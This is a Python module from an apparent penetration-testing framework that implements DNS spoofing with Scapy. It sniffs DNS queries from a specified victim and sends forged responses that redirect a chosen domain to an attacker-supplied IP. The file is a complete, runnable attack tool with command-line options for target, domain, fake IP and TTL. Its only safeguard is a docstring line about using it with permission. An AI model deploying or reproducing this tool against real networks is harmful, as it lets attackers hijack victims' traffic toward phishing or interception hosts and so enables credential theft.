"""
Author: Chris Martinez
Date: 2 June 2026
Version: 1.0.0
Name: __init__.py (dns_spoof)
Description: This module performs DNS spoofing attacks against a specified 
target host by intercepting DNS queries and sending forged responses that
redirect a queried domain to an attacker controlled IP address. It
captures DNS traffic on port 53, filters for queries matching the
target IP and domain, and crafts spoofed DNS responses before the
real DNS server can reply. Supports both IPv4 and IPv6 targets.
Should only be used against systems you own or have explicit written
permission to test.
"""
import argparse
import ipaddress

from functools import partial
from scapy.all import sniff, sendp
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, IPv6, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Packet

from netlink.core.base_module import BaseModule
from netlink.core.output import OutputManager

class DNSSpoof(BaseModule):
    """
    Performs DNS spoofing attacks by intercepting DNS queries from a target
    host and sending forged responses that redirect the queried domain to
    a specified IP address. Monitors DNS traffic on port 53 using a BPF
    filter, matches queries against the target IP and domain, and crafts
    a spoofed DNS response with a forged answer record before the real
    DNS server can respond. Supports both IPv4 and IPv6. Should only be
    used against systems you own or have explicit written permission to
    test.
    """

    ############################################################################
    # Class Level Attributes
    ############################################################################
    NAME: str = "dns_spoof"
    DESCRIPTION: str = "Performs DNS spoofing on a designated victim"
    REQUIRES_ROOT: bool = True

    DNS_FILTER = "udp and port 53"
    DNS_QUERY = 0
    DNS_RESPONSE = 1

    ############################################################################
    # Constructor
    ############################################################################
    def __init__(self, iface: str, output: OutputManager):
        super().__init__(iface, output)
        self._pkt_count = 0

    ############################################################################
    # Abstract Required Methods
    ############################################################################
    def add_args(self, parser: argparse.ArgumentParser) -> None:
        """
        Adds module-specific arguments to the argument parser. This method is
        called by the Engine when setting up the CLI for this module. Defines
        arguments for target IP, domain to spoof, fake redirect IP, packet
        count, timeout, and TTL for the forged DNS record.
        Args:
            parser (argparse.ArgumentParser): The argument parser to which
                                            module-specific args are added.
        """
        parser.add_argument(
            '-c',
            '--count',
            type=int,
            action='store',
            dest='count',
            default=0,
            help="Number of packets to capture (Default=infinite)"
        )

        parser.add_argument(
            '-d',
            '--domain',
            type=str,
            action='store',
            dest='domain',
            required=True,
            help="The domain to filter for and spoof"
        )

        parser.add_argument(
            '-s',
            '--spoof-ip',
            type=str,
            action='store',
            dest='spoof_ip',
            required=True,
            help="The fake IP address to redirect the victim to"
        )

        parser.add_argument(
            '-t',
            '--target',
            type=str,
            action='store',
            dest='target',
            required=True,
            help="The target's IP address where the DNS Response will be sent"
        )

        parser.add_argument(
            '--timeout',
            type=int,
            action='store',
            dest='timeout',
            default=None,
            help="Stop sniffing after N seconds (Default=None)"    
        )

        parser.add_argument(
            '--ttl',
            type=int,
            action='store',
            dest='ttl',
            default=300,
            help="The time in seconds for the spoof ip to remain in DNS cache"
        )

    def run(self, args: argparse.Namespace) -> None:
        """
        Executes the main functionality of the DNSSpoof module. Sets up a
        packet capture using Scapy's sniff() with a port 53 BPF filter and
        dispatches each captured packet to _process_packet() via
        functools.partial. Prints a packet count summary on exit regardless
        of how the session ends.
        Args:
            args (argparse.Namespace): The parsed command-line arguments
                                    specific to the DNSSpoof module.
        """
        prn = partial(self._process_packet, args=args)
        sniff_kwargs = {
            'iface': self.iface,
            'prn': prn,
            'filter': self.DNS_FILTER,
            'count': args.count,
            'timeout': args.timeout,
        }

        try:
            msg = f"Sniffing for packets that are resolving {args.domain}"
            self.output.info(msg)
            sniff(**sniff_kwargs)
        except KeyboardInterrupt:
            self.output.warn("Keyboard interrupted, session has ceased")
        finally:
            label = f"{'Packet' if self._pkt_count == 1 else 'Packets'}"
            msg = f"Total packets sniffed -> {self._pkt_count} {label}"
            self.output.info(msg)

    ############################################################################
    # Methods
    ############################################################################
    def validate_args(self, args: argparse.Namespace) -> bool:
        """
        Validates the provided arguments for the DNSSpoof module. Checks that
        target and spoof_ip are valid IPv4 and IPv6 addresses, that domain is 
        not empty or whitespace, and that ttl is greater than zero.
        Args:
            args (argparse.Namespace): The parsed command-line arguments
                                        specific to the DNSSpoof module.
        Returns:
            bool: True if all arguments are valid, False otherwise.
        """
        try:
            ipaddress.ip_address(args.target)
        except ValueError:
            msg = "A valid IPv4/IPv6 address for the target required"
            self.output.error(msg)
            return False

        try:
            ipaddress.ip_address(args.spoof_ip)
        except ValueError:
            msg = "A valid IPv4/IPv6 address to redirect the target to required"
            self.output.error(msg)
            return False
        
        if not args.domain.strip():
            msg = "Must provide a domain to sniff"
            self.output.error(msg)
            return False

        if args.ttl <= 0:
            msg = "TTL must be greater than zero"
            self.output.error(msg)
            return False
            
        if args.count < 0:
            msg = "Count cannot be a negative number"
            self.output.error(msg)
            return False
    
        if args.timeout is not None and args.timeout < 0:
            msg = "Timeout cannot be a negative number"
            self.output.error(msg)
            return False

        return True

    def _process_packet(self, pkt: Packet, args: argparse.Namespace) -> None:
        """
        Processes each captured DNS packet and sends a forged response if the
        packet matches the target IP and domain. Extracts the source and
        destination addresses, ports, and DNS fields from the original query
        and constructs a spoofed DNS response with the forged IP in the answer
        record. Supports both IPv4 and IPv6. Increments the packet counter on
        each successful spoof sent.
        Args:
            pkt (Packet): The captured packet object provided by Scapy.
            args (argparse.Namespace): The parsed command-line arguments used
                                    to check target, domain, spoof_ip, and
                                    ttl.        
        """
        if DNS in pkt:
            # To defensively guard with MacOS BPF Quirks
            if IP not in pkt and IPv6 not in pkt:
                return

            if pkt[DNS].qr == self.DNS_QUERY:
                target_ip = pkt[IP].src if IP in pkt else pkt[IPv6].src

                if target_ip != args.target:
                    return
                
                domain_from_pkt = pkt[DNS].qd.qname.decode()
                domain_from_user = args.domain + '.'

                if domain_from_pkt == domain_from_user:
                    server_mac = pkt[Ether].dst
                    target_mac = pkt[Ether].src
                    server_ip = pkt[IP].dst if IP in pkt else pkt[IPv6].dst
                    server_port = pkt[UDP].dport
                    target_port = pkt[UDP].sport
                    dns_type = pkt[DNS].qd.qtype
                    dns_id = pkt[DNS].id
                    dns_question_record = pkt[DNS].qd

                    dns_response_record = DNSRR(
                        rrname=str.encode(domain_from_pkt),
                        type=dns_type,
                        ttl=args.ttl,
                        rdata=args.spoof_ip
                    )

                    #Server=Source, Target=Destination
                    response_pkt = Ether(
                        src=server_mac,
                        dst=target_mac
                    )
                    
                    if IP in pkt:
                        response_pkt /= IP(
                            src=server_ip,
                            dst=target_ip
                        )
                    else:
                        response_pkt /= IPv6(
                            src=server_ip,
                            dst=target_ip
                        )  
                        
                    response_pkt /= UDP(
                        sport=server_port,
                        dport=target_port
                    )/DNS(
                        id = dns_id,
                        qd=dns_question_record,
                        qr=self.DNS_RESPONSE,
                        qdcount=1,
                        ancount=1,
                        an=dns_response_record,
                    )

                    sendp(response_pkt, verbose=0)
                    self.output.success('Sent spoof packet to target...')
                    self._pkt_count += 1
                else:
                    return
